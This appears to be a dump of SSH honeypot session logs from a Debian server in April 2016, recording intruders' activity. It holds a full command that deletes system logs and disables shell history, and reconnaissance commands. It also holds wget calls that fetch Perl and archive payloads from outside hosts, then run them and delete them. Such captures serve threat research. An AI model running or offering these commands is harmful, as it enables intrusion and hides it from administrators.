@@ -1,0 +1,3108 @@
+__________________________________
+Processing ../log/tty/20160423-065318-689aad5f-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ __________________________________
+Processing ../log/tty/20160423-065326-11544bcf-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ __________________________________
+Processing ../log/tty/20160423-065335-0d7fc9a4-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ __________________________________
+Processing ../log/tty/20160423-065344-fcf65263-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ __________________________________
+Processing ../log/tty/20160423-065353-297ca643-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ __________________________________
+Processing ../log/tty/20160423-114140-74c4819b-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ __________________________________
+Processing ../log/tty/20160423-114144-74c4819b-1e.log file...
+Linux
+__________________________________
+Processing ../log/tty/20160423-114144-74c4819b-2i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ __________________________________
+Processing ../log/tty/20160423-114147-74c4819b-3e.log file...
+             total       used       free     shared    buffers     cached
+Mem:          7880       7690        189          0        400       5171
+-/+ buffers/cache:       2118       5761
+Swap:         3675        129       3546
+__________________________________
+Processing ../log/tty/20160423-114148-74c4819b-4i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ __________________________________
+Processing ../log/tty/20160423-114151-74c4819b-5e.log file...
+ PID TTY      STAT    TIME COMMAND
+5673 pts/0    Ss      0:00 -bash
+5679 pts/0    R+      0:00 ps x
+__________________________________
+Processing ../log/tty/20160423-114517-41894a63-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog ; touch /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; export HISTFILE=/dev/null
+[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l    1  unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog ; touch /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; export HISTFILE=/dev/null
+[4h[4l[4h[4l[4h[4l[4hrichard@svr04:~$ w; uname -a
+[4l 11:45:28 up 3 days,  9:57,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+richard  pts/0    62.210.77.149     11:45    0.00s  0.00s  0.00s w
+[4h[4lLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux
+[4hrichard@svr04:~$ cat /pr[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat /proc/cp[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat /proc/cpuinfo 
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+[4hrichard@svr04:~$ /sbin/ifconfi[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P/sbin/ifconfig | grep inet
+[4leth0      Link encap:Ethernet  HWaddr 04:01:16:df:2d:01
+          inet addr:172.31.52.233  Bcast:172.31.52.255  Mask:255.255.255.0
+          inet6 addr: fe80::601:16ff:fedf:2d01/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:139435762 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:116082382 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:102191499830 (102.1 GB)  TX bytes:68687923025 (68.6 GB)
+
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:110 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:110 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          RX bytes:19932 (19.9 KB)  TX bytes:19932 (19.9 KB)
+[4hrichard@svr04:~$ uname -a
+[4lLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux
+[4hrichard@svr04:~$ sudo su
+[4l[4l[4hrichard@svr04:~$ id
+[4luid=1000(richard) gid=1000(richard) groups=1000(richard)
+[4hrichard@svr04:~$ cat /etc/issue
+[4lDebian GNU/Linux 7 \n \l
+
+[4hrichard@svr04:~$ pwd
+[4l/home/richard
+[4hrichard@svr04:~$ ls -al
+[4ldrwxr-xr-x 1 richard richard 4096 2013-04-05 12:02 .
+drwxr-xr-x 1 richard richard 4096 2013-04-05 12:02 ..
+-rw-r--r-- 1 richard richard  220 2013-04-05 12:02 .bash_logout
+-rw-r--r-- 1 richard richard 3392 2013-04-05 12:02 .bashrc
+-rw-r--r-- 1 richard richard  675 2013-04-05 12:02 .profile
+[4hrichard@svr04:~$ mkdir .kde
+[4l[4hrichard@svr04:~$ cd .k[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd .kde/
+[4l[4hrichard@svr04:~/.kde$ wget lavidaloca.host.sk/muh.tgz
+[4l--2016-04-23 11:47:04
+--  http://lavidaloca.host.sk/muh.tgzConnecting to lavidaloca.host.sk:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 232707 (227K) [application/x-gzip]
+Saving to: `/home/richard/.kde/muh.tgz
+
+ 1% [>                                      ] 2,639        1K/s  eta 2m 52s100%[======================================>] 232,707      1K/s
+
+2016-04-23 11:47:07 (1 KB/s) - `/home/richard/.kde/muh.tgz' saved [232707/232707]
+[4hrichard@svr04:~/.kde$ tar zxvf muh[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ptar zxvf muh.tgz 
+[4l.profiles
+.profiles/run
+
+
+^C
+[4hrichard@svr04:~/.kde$ ls -al
+[4ldrwxr-xr-x 1 root root   4096 2016-04-23 11:46 .
+drwxr-xr-x 1 root root   4096 2016-04-23 11:46 ..
+drwx------ 1 root root   4096 2013-02-13 15:35 .profiles
+-rw-r--r-- 1 root root 232707 2016-04-23 11:47 muh.tgz
+[4hrichard@svr04:~/.kde$ cd ..
+[4l[4hrichard@svr04:~$ rm -rf .k[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Prm -rf .kde/
+[4l[4hrichard@svr04:~$ wget sniff.pe.hu/prv/slbz.pl
+[4l--2016-04-23 11:48:41
+--  http://sniff.pe.hu/prv/slbz.plConnecting to sniff.pe.hu:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 41006 (40K) [text/whatever]
+Saving to: `/home/richard/slbz.pl
+
+ 3% [=>                                     ] 1,278        6K/s  eta 6s100%[======================================>] 41,006       6K/s
+
+2016-04-23 11:48:42 (6 KB/s) - `/home/richard/slbz.pl' saved [41006/41006]
+[4hrichard@svr04:~$ nano sl[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnano slbz.pl 
+[4lE558: Terminal entry not found in terminfo
+[4hrichard@svr04:~$ pico sl[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ppico slbz.pl 
+[4lE185: Cannot find color scheme
+[4hrichard@svr04:~$ 
+richard@svr04:~$ 
+richard@svr04:~$ 
+richard@svr04:~$ 
+richard@svr04:~$ wget lavidaloca.host.sk/joint.log
+[4l--2016-04-23 11:59:55
+--  http://lavidaloca.host.sk/joint.logConnecting to lavidaloca.host.sk:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 41048 (40K) [text/plain]
+Saving to: `/home/richard/joint.log
+
+ 6% [==>                                    ] 2,649        6K/s  eta 6s100%[======================================>] 41,048       6K/s
+
+2016-04-23 11:59:55 (6 KB/s) - `/home/richard/joint.log' saved [41048/41048]
+[4hrichard@svr04:~$ chmod +x *
+[4lchmod: cannot access x: No such file or directory
+[4hrichard@svr04:~$ [Kchmod +x *[1D[1Pjoin[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pchmod +x joint.log 
+[4lchmod: cannot access x: No such file or directory
+[4hrichard@svr04:~$ pwd
+[4l/home/richard
+[4hrichard@svr04:~$ ls -al
+[4ldrwxr-xr-x 1 richard richard  4096 2013-04-05 12:02 .
+drwxr-xr-x 1 richard richard  4096 2013-04-05 12:02 ..
+-rw-r--r-- 1 richard richard   220 2013-04-05 12:02 .bash_logout
+-rw-r--r-- 1 richard richard  3392 2013-04-05 12:02 .bashrc
+-rw-r--r-- 1 richard richard   675 2013-04-05 12:02 .profile
+-rw-r--r-- 1 root root 41048 2016-04-23 11:59 joint.log
+-rw-r--r-- 1 root root 41006 2016-04-23 11:48 slbz.pl
+[4hrichard@svr04:~$ rm -rf slbz.pl
+[4l[4hrichard@svr04:~$ perl joint.log
+[4l[4hrichard@svr04:~$ rm -rf joint.log
+[4l[4hrichard@svr04:~$ ls
+[4l[4hrichard@svr04:~$ [4l__________________________________
+Processing ../log/tty/20160423-154205-0d586750-0e.log file...
+bash: (: command not found
+__________________________________
+Processing ../log/tty/20160423-155441-eec31370-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hrichard@svr04:~$ __________________________________
+Processing ../log/tty/20160423-165744-95f9ba4f-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# wget http://123.184.40.11:2350/dusyn
+[4l--2016-04-23 16:57:55
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4hroot@svr04:~# wget http://123.184.40.11:2350/dusyn
+[4l--2016-04-23 16:58:03
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4hroot@svr04:~# wget http://123.184.40.11:2350/dusyn
+[4l--2016-04-23 16:58:58
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4hroot@svr04:~# wget http://123.184.40.11:2350/dusyn
+[4l--2016-04-23 16:59:04
+--  http://httpConnecting to http:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'http' not found: [Errno -2] Name or service not known.
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160425-000332-30539227-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# ls
+[4lfile 
+[4hroot@svr04:~# vim
+[4lE558: Terminal entry not found in terminfo
+[4hroot@svr04:~# pip isntall[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnstall hi
+bash: pip: command not found
+root@svr04:~# timed out waiting for input: auto-logout
+__________________________________
+Processing ../log/tty/20160425-010156-2562f92c-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# gi[1D[1P[1D[1P[K[K[Ksudo apt-get git
+[4l[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hroot@svr04:~# ls
+[4lfile 
+[4hroot@svr04:~# c[1D[1Pvimf [1D[1P[1D[1P file[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pvim file/
+[4lE558: Terminal entry not found in terminfo
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160425-011103-c51eff60-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# exit
+[4l__________________________________
+Processing ../log/tty/20160425-011229-0a73503e-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# [4l__________________________________
+Processing ../log/tty/20160425-011300-188c7e05-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# [4l__________________________________
+Processing ../log/tty/20160425-043109-c40512bd-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hb@svr04:~$ __________________________________
+Processing ../log/tty/20160425-092217-b8d1f499-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160425-093834-40177905-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160425-141636-dfb5abbe-0e.log file...
+test__________________________________
+Processing ../log/tty/20160425-141636-dfb5abbe-1e.log file...
+Linux version 3.2.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.6.3 (Debian 4.6.3-14) ) #1 SMP Debian 3.2.68-1+deb7u1
+__________________________________
+Processing ../log/tty/20160425-141639-96a456ce-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-141639-96a456ce-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-141643-96a456ce-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-141644-96a456ce-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-141646-ae7ecd06-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-141646-ae7ecd06-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-141651-ae7ecd06-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-141651-ae7ecd06-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-141653-222df990-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-141654-222df990-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-141658-222df990-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-141659-222df990-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-141701-4be8c103-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-141701-4be8c103-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-141706-4be8c103-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-141706-4be8c103-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-191955-2dda4c6f-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hfmaster@svr04:~$ __________________________________
+Processing ../log/tty/20160425-193035-5ef7cc15-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-193035-5ef7cc15-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-193040-5ef7cc15-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-193040-5ef7cc15-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-193043-448b0adf-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-193043-448b0adf-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-193047-448b0adf-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-193048-448b0adf-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-193050-9241eaac-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-193050-9241eaac-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-193055-9241eaac-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-193055-9241eaac-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-193058-37a46483-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-193058-37a46483-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-193102-37a46483-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-193103-37a46483-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-193438-8a47cd50-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hfmaster@svr04:~$ w
+[4l 19:34:41 up 18:23,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+fmaster  pts/0    46.164.129.106    19:34    0.00s  0.00s  0.00s w
+[4hfmaster@svr04:~$ cat /etc/passwd |grep sh
+[4lroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+richard:x:1000:1000:Richard Texas,,,:/home/richard:/bin/bash
+cat: |: No such file or directory
+cat: grep: No such file or directory
+cat: sh: No such file or directory
+[4hfmaster@svr04:~$ __________________________________
+Processing ../log/tty/20160425-200756-1e13cf84-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-200756-1e13cf84-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-200800-1e13cf84-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-200801-1e13cf84-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-200803-82de25ea-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-200803-82de25ea-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-200808-82de25ea-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-200808-82de25ea-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-200810-a51ba2dd-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-200811-a51ba2dd-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-200816-a51ba2dd-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-200817-a51ba2dd-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-200820-9e1155de-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-200820-9e1155de-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-200826-9e1155de-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-200826-9e1155de-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-201413-62b6ce62-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-201413-62b6ce62-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-201418-62b6ce62-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-201418-62b6ce62-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-201420-2690b4cb-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-201421-2690b4cb-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-201425-2690b4cb-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-201425-2690b4cb-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-201428-bc42b297-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-201428-bc42b297-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-201433-bc42b297-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-201433-bc42b297-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-201435-3c6b5389-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-201436-3c6b5389-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-201441-3c6b5389-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-201441-3c6b5389-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-213110-5718f81b-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-213111-5718f81b-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-213115-5718f81b-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-213116-5718f81b-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-213118-2c111683-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-213118-2c111683-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-213122-2c111683-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-213123-2c111683-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-213125-90d49758-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-213125-90d49758-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-213130-90d49758-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-213131-90d49758-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-213133-352af0fe-0e.log file...
+__________________________________
+Processing ../log/tty/20160425-213133-352af0fe-1e.log file...
+__________________________________
+Processing ../log/tty/20160425-213138-352af0fe-2e.log file...
+__________________________________
+Processing ../log/tty/20160425-213138-352af0fe-3e.log file...
+bash: /tmp/.xs/daemon.mipsel.mod: command not found
+__________________________________
+Processing ../log/tty/20160425-235132-35cc9ded-0i.log file...
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+[4hroot@svr04:~# __________________________________
+Processing ../log/tty/20160426-031959-d46ee367-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-031959-d46ee367-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-032003-d46ee367-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-032004-d46ee367-3e.log file...
+bash: /tmp/.xs/daemon.armv4l.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-032006-283566a1-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-032007-283566a1-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-032010-283566a1-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-032011-283566a1-3e.log file...
+bash: /tmp/.xs/daemon.i686.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-032013-fd1fa071-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-032014-fd1fa071-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-032018-fd1fa071-2e.log file...
+__________________________________
+Processing ../log/tty/20160426-032019-fd1fa071-3e.log file...
+bash: /tmp/.xs/daemon.mips.mod: command not found
+__________________________________
+Processing ../log/tty/20160426-032021-f73dc42e-0e.log file...
+__________________________________
+Processing ../log/tty/20160426-032021-f73dc42e-1e.log file...
+__________________________________
+Processing ../log/tty/20160426-032026-f73dc42e-2e.log file...
+__________________________________
